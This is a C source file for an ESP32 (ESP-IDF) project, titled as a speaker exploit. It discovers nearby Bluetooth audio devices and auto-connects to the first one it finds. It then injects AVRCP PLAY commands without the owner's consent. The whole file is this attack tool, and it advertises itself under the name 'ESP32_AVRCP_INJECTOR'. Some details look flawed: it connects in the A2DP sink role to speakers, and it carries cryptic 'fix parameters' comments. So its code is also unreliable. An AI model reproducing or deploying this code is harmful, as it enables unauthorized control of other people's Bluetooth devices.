// speaker_exploit.c - ESP-IDF project to scan for speakers and auto-inject AVRCP commands

#include "esp_bt.h"
#include "esp_log.h"
#include "esp_bt_main.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "nvs_flash.h" 
#include <string.h>

static const char *TAG = "BT_AVRCP";

static esp_bd_addr_t target_bda = {0};
static bool device_found = false;

// Only accept Audio/Video major class (0x04)
static bool is_audio_device(uint32_t cod) {
    uint8_t major = (cod >> 8) & 0x1F;
    return (major == 0x04);
}

static void bt_app_avrc_metadata_cb(esp_avrc_ct_cb_event_t event, esp_avrc_ct_cb_param_t *param) {}

static void bt_app_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    switch (event) {
        case ESP_BT_GAP_DISC_RES_EVT: {
            char bda_str[18];
            sprintf(bda_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
                    param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);

            ESP_LOGI(TAG, "Found device: %s", bda_str);

            // Parse device class and EIR
            uint32_t cod = 0;
            uint8_t *eir = NULL;

            for (int i = 0; i < param->disc_res.num_prop; i++) {
                switch (param->disc_res.prop[i].type) {
                    case ESP_BT_GAP_DEV_PROP_COD:
                        cod = *(uint32_t *)param->disc_res.prop[i].val;
                        ESP_LOGI(TAG, "  Class of Device: 0x%06x", cod);
                        break;
                    case ESP_BT_GAP_DEV_PROP_EIR:
                        eir = (uint8_t *)param->disc_res.prop[i].val;
                        break;
                    default:
                        break;
                }
            }

            // Try to get device name from EIR
            if (eir) {
                uint8_t len = 0;
                const uint8_t *name = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_CMPL_LOCAL_NAME, &len);
                if (!name) {
                    name = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_SHORT_LOCAL_NAME, &len);
                }
                if (name) {
                    ESP_LOGI(TAG, "  Name: %.*s", len, (char *)name);
                }
            }

            // Auto-connect to first audio/video class device
            if (!device_found && is_audio_device(cod)) {
                memcpy(target_bda, param->disc_res.bda, ESP_BD_ADDR_LEN);
                device_found = true;
                esp_bt_gap_cancel_discovery();
                ESP_LOGI(TAG, "  Target audio device selected: %s", bda_str);
                esp_a2d_sink_connect(target_bda); 
            }

            break;
        }

        case ESP_BT_GAP_DISC_STATE_CHANGED_EVT: {
            ESP_LOGI(TAG, "Discovery state changed: %d", param->disc_st_chg.state);
            break;
        }

        default:
            break;
    }
}

static void bt_app_a2d_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
    switch (event) {
        case ESP_A2D_CONNECTION_STATE_EVT: {
            // A2DP connection callback
            if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED) {
                ESP_LOGI(TAG, "Connected to A2DP device, injecting PLAY command");
                esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PLAY, ESP_AVRC_PT_CMD_STATE_PRESSED); // 修复参数
                esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PLAY, ESP_AVRC_PT_CMD_STATE_RELEASED); // 修复参数
            } else {
                ESP_LOGI(TAG, "A2DP connection state: %d", param->conn_stat.state);
            }
            break;
        }
        default:
            break;
    }
}

void app_main(void) {
    // Step 1: Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Step 2: Release BLE memory and initialize Classic BT
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));

    // Step 3: Initialize Bluedroid stack
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    // Step 4: Register BT + A2DP + AVRCP callbacks
    ESP_ERROR_CHECK(esp_bt_gap_register_callback(bt_app_gap_cb));
    ESP_ERROR_CHECK(esp_a2d_register_callback(bt_app_a2d_cb));
    ESP_ERROR_CHECK(esp_a2d_sink_register_data_callback(NULL)); // required
    ESP_ERROR_CHECK(esp_a2d_sink_init());

    ESP_ERROR_CHECK(esp_avrc_ct_init());
    ESP_ERROR_CHECK(esp_avrc_ct_register_callback(bt_app_avrc_metadata_cb));

    // Step 5: Set device name & discoverable mode
    esp_bt_gap_set_device_name("ESP32_AVRCP_INJECTOR");
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);

    ESP_LOGI(TAG, "Starting device discovery");
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 10, 0);
}